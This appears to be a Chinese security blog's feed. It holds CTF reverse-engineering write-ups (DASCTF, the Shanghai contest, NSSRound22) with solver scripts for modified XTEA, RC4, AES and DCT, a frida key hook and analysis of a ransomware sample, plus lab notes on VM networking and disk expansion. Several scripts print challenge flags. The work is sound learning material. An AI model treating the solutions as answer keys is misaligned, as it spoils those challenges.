class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_hash</span>(<span class="hljs-params">input_str</span>):<br>    key_bytes = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">16</span>)<br>    temp = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_str:<br>        char_val = <span class="hljs-built_in">ord</span>(char)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            temp[j] = ((temp[j] * <span class="hljs-number">31</span>) + char_val) % <span class="hljs-number">251</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        key_bytes[i] = temp[i] % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(key_bytes)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_data, key</span>):<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    decrypted_data = cipher.decrypt(base64.b64decode(encrypted_data))<br>    <span class="hljs-keyword">return</span> decrypted_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).rstrip(<span class="hljs-string">&#x27;\x08\x07\x06\x05\x04\x03\x02\x01&#x27;</span>)  <span class="hljs-comment"># 去掉填充字符</span><br><br><span class="hljs-comment"># 已知的密钥字符串</span><br>KEY = <span class="hljs-string">&quot;DSACTF&quot;</span><br><br><span class="hljs-comment"># 已知的密文</span><br>encrypted_data = <span class="hljs-string">&quot;TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLpcHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOIM+6uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEiMgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OKMcGIke/NZIM6Sr5fL3t6psDOOkw2C/5uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rhtPMtoaD8FxDg0wWSLZA53fQfNA==&quot;</span><br><br><span class="hljs-comment"># 生成解密密钥</span><br>key = custom_hash(KEY)<br><br><span class="hljs-comment"># 解密数据</span><br>decrypted_data = decrypt(encrypted_data, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密后的数据:&quot;</span>, decrypted_data)<br></code></pre></td></tr></table></figure><p>MainActivity看不出啥</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721479890172-7372c393-88cc-460e-86f0-40452d8429cd.png" class="" title="img"><p>有个so层加载的，当时8.3反编译不了，后面发现7.7可以，果然不同版本的还是得试试</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721533710176-d3441e0b-e3f8-4bbe-b645-9788768f16af.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721527213369-cecdd1f1-e538-48b4-82e6-27270d11d286.png" class="" title="img"><p>进到encrypt里面，问gpt发现是DCT</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721527194587-753d377e-5fe4-45e2-ab69-f8146928e8ef.png" class="" title="img"><p>解密，发现最后一位是125，应该是对的</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721527289813-cacad651-ad53-4064-bd67-00fe19461c1a.png" class="" title="img"><p>直接手动四舍五入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> scipy.fftpack <span class="hljs-keyword">import</span> idct<br><br><span class="hljs-comment"># 提供的加密数据</span><br>encrypted_data = [<span class="hljs-number">458.853181</span>, -<span class="hljs-number">18.325492</span>, -<span class="hljs-number">18.251911</span>, -<span class="hljs-number">2.097520</span>, -<span class="hljs-number">21.198660</span>, -<span class="hljs-number">22.304648</span>, <span class="hljs-number">21.103162</span>, -<span class="hljs-number">5.786284</span>,<br>                  -<span class="hljs-number">15.248906</span>, <span class="hljs-number">15.329286</span>, <span class="hljs-number">16.919499</span>, -<span class="hljs-number">19.669045</span>, <span class="hljs-number">30.928253</span>, -<span class="hljs-number">37.588034</span>, -<span class="hljs-number">16.593954</span>, -<span class="hljs-number">5.505211</span>,<br>                  <span class="hljs-number">3.014744</span>, <span class="hljs-number">6.553616</span>, <span class="hljs-number">31.131491</span>, <span class="hljs-number">16.472500</span>, <span class="hljs-number">6.802400</span>, -<span class="hljs-number">78.278577</span>, <span class="hljs-number">15.280099</span>, <span class="hljs-number">3.893073</span>, <span class="hljs-number">56.493581</span>,<br>                  -<span class="hljs-number">34.576344</span>, <span class="hljs-number">30.146729</span>, <span class="hljs-number">4.445671</span>, <span class="hljs-number">6.732204</span>]<br><br><span class="hljs-comment"># 执行离散余弦反变换</span><br>decrypted_data = idct(encrypted_data, norm=<span class="hljs-string">&#x27;ortho&#x27;</span>)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_data)<br><br><br>a=[<span class="hljs-number">68</span>,<span class="hljs-number">65</span>,<span class="hljs-number">83</span>,<span class="hljs-number">67</span>,<span class="hljs-number">84</span>,<span class="hljs-number">70</span>,<span class="hljs-number">123</span>,<span class="hljs-number">89</span>,<span class="hljs-number">48</span>,<span class="hljs-number">117</span>,<span class="hljs-number">95</span>,<span class="hljs-number">65</span>,<span class="hljs-number">114</span>,<span class="hljs-number">51</span>,<span class="hljs-number">82</span>,<span class="hljs-number">101</span>,<span class="hljs-number">52</span>,<span class="hljs-number">108</span>,<span class="hljs-number">108</span>,<span class="hljs-number">121</span>,<span class="hljs-number">95</span>,<span class="hljs-number">72</span>,<span class="hljs-number">64</span>,<span class="hljs-number">99</span>,<span class="hljs-number">107</span>,<span class="hljs-number">51</span>,<span class="hljs-number">114</span>,<span class="hljs-number">33</span>,<span class="hljs-number">125</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#DASCTF&#123;Y0u_Ar3Re4lly_H@ck3r!&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tea魔改</tag>
      
      <tag>SMC</tag>
      
      <tag>app逆向</tag>
      
      <tag>DCT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实现两台虚拟机相互ping通</title>
    <link href="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/"/>
    <url>/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/</url>
    
    <content type="html"><![CDATA[<p>为了使虚拟机之间能够相互ping通且都能上网，比较快的方法是设置一张虚拟网卡，然后让所有虚拟机都用同一张网卡，这样不同虚拟机就在同一个局域网下了</p><p>先打开虚拟网络编辑器</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162827380.png" class="" title="image-20240623162827380"><p>设置一张虚拟网卡为NAT模式，子网ip可以自己定义</p><p>后续虚拟机都要选择上面的网卡</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162529826.png" class="" title="image-20240623162529826"><p>之后关闭虚拟机</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162755653.png" class="" title="image-20240623162755653"><p>点击编辑虚拟机设置，选择NAT模式</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162612160.png" class="" title="image-20240623162612160"><p>或者自定义选择对应虚拟网卡（这时候ip会不定时变动）</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162733670.png" class="" title="image-20240623162733670"><p>再打开应该就能相互ping通了</p><p>一次渗透测试的时候主机ping不通靶机(主机：kali，靶机win_xp)</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623163125519.png" class="" title="image-20240623163125519"><p>但是靶机能ping主机</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623163157671.png" class="" title="image-20240623163157671"><p>这时候需要关闭win_xp的防火墙</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623163320427.png" class="" title="image-20240623163320427"><p>关闭之后就可以正常ping啦</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623163356393.png" class="" title="image-20240623163356393">]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024上海市赛初赛部分wp</title>
    <link href="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<p>中途截的两张</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716648634963-1eb42663-5133-4d7f-b417-8608dcbe8f33.png" class="" title="img"><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716624422591-b7db8b02-4f36-42c3-98bb-80d01da837ee.png" class="" title="img"><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h2><p>看一下crazy和ohh</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603171319-f2529c89-e9b1-4427-bcf9-3f57ed4e908e.png" class="" title="img"><p>逆向得到fake flag</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603183325-dd6f2f91-460f-4d7c-a2af-6696384611f6.png" class="" title="img"><p>后面有自解密</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603593551-2a159092-e376-4aec-a153-6fa8fa9f4104.png" class="" title="img"><p>运行到最后一个断点后f7进入</p><p>强制c，然后p</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716604322919-137970f1-0202-4803-9368-411aff9e23ab.png" class="" title="img"><p>404040是密文</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603082521-c730d1aa-5d72-4a1c-a4fe-c1222a44cbfe.png" class="" title="img"><p>xxx明显是rc4</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603126787-a478cc73-63c9-4f2b-8b72-472ff07fbd34.png" class="" title="img"><p>提取密文</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603283906-646967f4-9e30-4075-b3ff-99fd22db8074.png" class="" title="img"><p>key就是前面的伪flag</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716604463744-440f26c5-523b-4a90-8a0d-94ca0e75922c.png" class="" title="img"><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">flag&#123;This_is_<span class="hljs-built_in">a_beautiful</span>_day!&#125;<br></code></pre></td></tr></table></figure><h2 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h2><p>找到des和密文</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611130216-1f03c04c-be2b-48f5-aff0-d1ee6e354060.png" class="" title="img"><p>so层实现getKey</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611157386-6330c5b7-07a3-4b8f-808c-e0a0d472c716.png" class="" title="img"><p>需要hook key</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611164735-73d017cd-67c7-4761-ad11-ed79b85700cb.png" class="" title="img"><p>frida-ps -U -a，直接看真正的包名，注入之后发现key就是ida中显示的，怪不得航电师傅直接十分钟秒了</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611188300-47f9b13d-d19e-4215-abe1-00a1322ef702.png" class="" title="img"><p>直接大厨解密</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611103119-f3561930-dc64-4142-94e5-88037bfba2fe.png" class="" title="img"><h2 id="ez-iot-2"><a href="#ez-iot-2" class="headerlink" title="ez_iot-2"></a>ez_iot-2</h2><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716648938024-3fc4ac11-6fa2-4cb6-9b2f-79aaa1de8f7e.png" class="" title="img"><p>想着bin转hex，但hex无法查看</p><p>file之后搜信息发现是原题</p><p><a href="https://blog.csdn.net/qq_40934487/article/details/90759362">https://blog.csdn.net/qq_40934487/article/details/90759362</a></p><p>无法执行sh，用unsquashfs提取后tmp目录无backdoor</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716693924453-bbffbb45-6463-4d49-850e-10a3e1bbb9d1.png" class="" title="img"><h1 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h1><h2 id="API接口安全分析题"><a href="#API接口安全分析题" class="headerlink" title="API接口安全分析题"></a>API接口安全分析题</h2><p><strong>1</strong></p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716631121962-2ed0573a-9843-43f9-900b-ee9d4569fdbf.png" class="" title="img"><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716623760405-856de68a-fd03-4aaa-a745-1824cd0ac50c.png" class="" title="img"><p><strong>2</strong></p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716631156880-e41daf4a-c947-41ca-9452-52d94ff72327.png" class="" title="img"><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716623780859-8db722e0-07b9-42ef-bcc6-7772b88223f6.png" class="" title="img"><h2 id="数据勒索分析"><a href="#数据勒索分析" class="headerlink" title="数据勒索分析"></a>数据勒索分析</h2><p><strong>1</strong></p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716631187178-1bbb5cbe-f085-469c-a67f-0f81452a03c7.png" class="" title="img"><p><strong>3</strong></p><p>ida分析发现可以直接用它的exe来加密，那么就想到我们可以自己写一个文件来看它怎么加密的</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716642650348-c384c8ec-d328-4d16-ab54-9f130da31644.png" class="" title="img"><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716642659732-13404109-fabe-41bd-85a6-e98f2a0e2d7d.png" class="" title="img"><p>经过比对发现，加密只是异或了23</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716642705593-cb856394-1599-4853-849a-4b901c7886b7.png" class="" title="img"><p>所以直接写一个脚本把加密的文件每个字节都异或23，解密后直接搜</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716630850175-6638fdb8-533f-4a40-91cd-7776a04fe8ce.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SMC</tag>
      
      <tag>frida</tag>
      
      <tag>固件逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C盘扩容</title>
    <link href="/2024/05/15/C%E7%9B%98%E6%89%A9%E5%AE%B9/"/>
    <url>/2024/05/15/C%E7%9B%98%E6%89%A9%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p>这两天刚买了硬盘，想着给C盘扩容来着，<del>为以后下2k做准备</del>。无法直接从E盘分配过去（不同硬盘），那就先把D盘的复制到E盘，再从D盘分内存到C盘。</p><p>基本教程网上有，先用DiskGenius拆分分区，把空余空间放到C和D之间<img src="/2024/05/15/C%E7%9B%98%E6%89%A9%E5%AE%B9/image-20240515234259306.png" class="" title="image-20240515234259306"></p><p>直接扩容C盘报错bitmap中有标记为已使用的簇，我这里chkdsk无效，于是用自带的磁盘管理器扩展卷就可以啦</p><img src="/2024/05/15/C%E7%9B%98%E6%89%A9%E5%AE%B9/image-20240515234110804.png" class="" title="image-20240515234110804">]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSRound22-Reverse专项赛</title>
    <link href="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/"/>
    <url>/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>22这个数字我很喜欢，就是出的题目难了点😥</p><h2 id="ezapk-1"><a href="#ezapk-1" class="headerlink" title="ezapk-1"></a>ezapk-1</h2><p>java层有XTEA</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1712995414906-b14e000a-2d31-46cc-962d-4f9db223adf7.png" class="" title="img"><p>魔改异或918,得到username，负数用jeb转成16进制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span> &#125;;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">32</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9E3779B9</span>, sum = <span class="hljs-number">0x9E3779B9</span> * num;<br>    <span class="hljs-type">uint32_t</span> v2[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0x3D121D26</span>, <span class="hljs-number">0x5E6189F9</span> &#125;, v3[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0xC1FB278E</span>, <span class="hljs-number">0x3B494648</span> &#125;, v5[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">0x3c36eb49</span>, <span class="hljs-number">0x81acb0c0</span>, <span class="hljs-number">0xfac269ae</span>, <span class="hljs-number">0xca5bf9ec</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x5678abcd</span>, <span class="hljs-number">0x89ABCDEF</span>, <span class="hljs-number">0xCDEF1234</span> &#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-comment">// v为要加密的数据是两个32位无符号整数</span><br>    <span class="hljs-comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">8</span>; m += <span class="hljs-number">2</span>) &#123;<span class="hljs-comment">//flag不全的话有可能是10</span><br>        sum = <span class="hljs-number">0x9E3779B9</span> * num;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     <span class="hljs-comment">/* basic cycle start */</span><br>            v5[m + <span class="hljs-number">1</span>] -= (v5[m] &lt;&lt; <span class="hljs-number">4</span> ^ v5[m] &gt;&gt; <span class="hljs-number">5</span>)  + v5[m] ^ <span class="hljs-number">918</span> ^ k[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + sum;<br>            sum += <span class="hljs-number">0x61C88647</span>;<br>            v5[m] -= (v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span> ^ v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + v5[m + <span class="hljs-number">1</span>] ^ <span class="hljs-number">918</span> ^ k[sum &amp; <span class="hljs-number">3</span>] + sum;<br>        &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//NS5_R0Un6_z2_apK</span><br></code></pre></td></tr></table></figure><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1713004158231-726848ee-4198-4918-bce9-006e362ecff1.png" class="" title="img"><p>魔改rc4,256变成128</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1712995673545-44f7187b-f19b-40fe-a91c-821e37fb43dd.png" class="" title="img"><p>一开始以为validatePassword函数还有加密，后来想如果是这样的话java层应该有密文，再去看发现上面函数只是确认密文，这样看的话java层validatePassword(str, encryptWithRC4(str2, str))两个str含义不一样</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1713005527064-45e41f64-2346-4139-88db-0ff023ce32a1.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">128</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">128</span><br>        j = (j + S[i]) % <span class="hljs-number">128</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">128</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span 